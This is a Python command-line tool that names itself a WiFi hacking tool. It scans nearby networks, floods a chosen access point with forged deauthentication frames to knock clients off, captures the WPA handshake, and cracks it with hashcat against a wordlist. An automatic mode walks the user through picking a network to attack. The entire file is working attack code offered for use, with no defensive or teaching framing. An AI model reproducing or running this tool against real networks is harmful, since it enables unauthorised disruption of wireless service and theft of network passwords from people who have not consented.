import os
import argparse
import subprocess
from scapy.all import *
from threading import Timer

def show_logo():
    logo = """
            _    _ _  __ _           _    _             _             
           | |  | (_)/ _(_)         | |  | |           | |            
           | |  | |_| |_ _  ___ __ _| |__| |_   _  __ _| |_ ___  _ __ 
           | |  | |  _| |/ __/ _` |  __  | | | |/ _` | __/ _ \| '__|
           | |__| | | | | (_| (_| | |  | | |_| | (_| | || (_) | |   
            \____/|_|_| |_|\___\__,_|_|  |_|\__,_|\__,_|\__\___/|_|   

                           WiFi Hacking Tool
                          Created by Shivam Kumar Shaw
    """
    print(logo)

def switch_mode(interface, mode):
    """
    Switches the network interface to the specified mode (monitor/managed).
    """
    if mode not in ['monitor', 'managed']:
        print(f"[-] Invalid mode: {mode}. Choose 'monitor' or 'managed'.")
        return

    print(f"[+] Switching {interface} to {mode} mode")
    subprocess.call(['ifconfig', interface, 'down'])
    subprocess.call(['iwconfig', interface, 'mode', mode])
    subprocess.call(['ifconfig', interface, 'up'])
    print(f"[+] {interface} is now in {mode} mode")

def scan_networks(interface):
    """
    Scans for available WiFi networks.
    """
    print(f"[+] Scanning for WiFi networks on interface {interface}")
    networks = {}
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11Elt].info.decode()
            if bssid not in networks:
                networks[bssid] = ssid

    sniff(iface=interface, prn=packet_handler, timeout=10)
    return networks

def deauth_attack(interface, target_bssid, client_mac, handshake_file):
    """
    Performs a deauthentication attack on the specified target and captures handshake.
    """
    def packet_handler(pkt):
        if pkt.haslayer(EAPOL):
            print("[+] WPA Handshake Captured")
            wrpcap(handshake_file, pkt, append=True)
            return True

    print(f"[+] Performing deauth attack on {target_bssid} targeting client {client_mac}")
    packet = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
    sendp(packet, iface=interface, count=100, inter=0.1)
    
    print(f"[+] Sniffing on interface {interface} for WPA Handshake")
    sniff(iface=interface, prn=packet_handler, timeout=30)

def sniff_handshake(interface, output_file):
    """
    Sniffs for a WPA handshake on the specified network interface.
    """
    def packet_handler(pkt):
        if pkt.haslayer(EAPOL):
            print("[+] WPA Handshake Captured")
            wrpcap(output_file, pkt, append=True)
            return True

    print(f"[+] Sniffing on interface {interface} for WPA Handshake")
    sniff(iface=interface, prn=packet_handler)

def crack_wpa_handshake(handshake_file, wordlist_file):
    """
    Cracks the WPA handshake using the specified wordlist.
    """
    if not os.path.exists(handshake_file):
        print(f"Handshake file {handshake_file} not found!")
        return
    
    if not os.path.exists(wordlist_file):
        print(f"Wordlist file {wordlist_file} not found!")
        return

    print(f"[+] Cracking WPA Handshake using wordlist {wordlist_file}")
    cmd = f"hashcat -m 2500 {handshake_file} {wordlist_file} --force"
    subprocess.call(cmd, shell=True)

def automatic_mode(interface):
    show_logo()
    networks = scan_networks(interface)
    
    if not networks:
        print("[-] No networks found. Please try again.")
        return
    
    print("[+] Available Networks:")
    for idx, (bssid, ssid) in enumerate(networks.items(), start=1):
        print(f"{idx}. {ssid} ({bssid})")

    choice = int(input("[+] Select a network to attack: "))
    selected_bssid = list(networks.keys())[choice - 1]

    switch_mode(interface, 'monitor')

    handshake_folder = "handshake"
    if not os.path.exists(handshake_folder):
        os.makedirs(handshake_folder)
    
    handshake_file = os.path.join(handshake_folder, f"{selected_bssid.replace(':', '-')}.cap")

    deauth_attack(interface, selected_bssid, "FF:FF:FF:FF:FF:FF", handshake_file)

def main():
    show_logo()
    parser = argparse.ArgumentParser(description='WiFi Hacker: WPA Handshake Capture and Crack Tool')
    parser.add_argument('-i', '--interface', help='Network interface to use for capturing handshake', required=True)
    parser.add_argument('-H', '--handshake', help='File to save the captured handshake', required=False)
    parser.add_argument('-w', '--wordlist', help='Wordlist file to use for cracking the handshake', required=False)
    parser.add_argument('-s', '--switch', help='Switch interface mode (monitor/managed)', choices=['monitor', 'managed'], required=False)
    parser.add_argument('-S', '--scan', help='Scan for available WiFi networks', action='store_true')
    parser.add_argument('-d', '--deauth', help='Perform deauth attack (requires --bssid and --client)', action='store_true')
    parser.add_argument('--bssid', help='Target BSSID for deauth attack')
    parser.add_argument('--client', help='Target client MAC address for deauth attack')
    parser.add_argument('-a', '--auto', help='Automatic mode for capturing handshake', action='store_true')
    args = parser.parse_args()

    if args.auto:
        automatic_mode(args.interface)
    elif args.switch:
        switch_mode(args.interface, args.switch)
    elif args.scan:
        networks = scan_networks(args.interface)
        if networks:
            print("[+] Available Networks:")
            for bssid, ssid in networks.items():
                print(f"{ssid} ({bssid})")
        else:
            print("[-] No networks found.")
    elif args.deauth:
        if not args.bssid or not args.client:
            print("[-] BSSID and client MAC address are required for deauth attack")
        else:
            handshake_file = os.path.join("handshake", f"{args.bssid.replace(':', '-')}.cap")
            deauth_attack(args.interface, args.bssid, args.client, handshake_file)
    elif args.handshake and args.wordlist:
        switch_mode(args.interface, 'monitor')
        sniff_handshake(args.interface, args.handshake)
        crack_wpa_handshake(args.handshake, args.wordlist)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
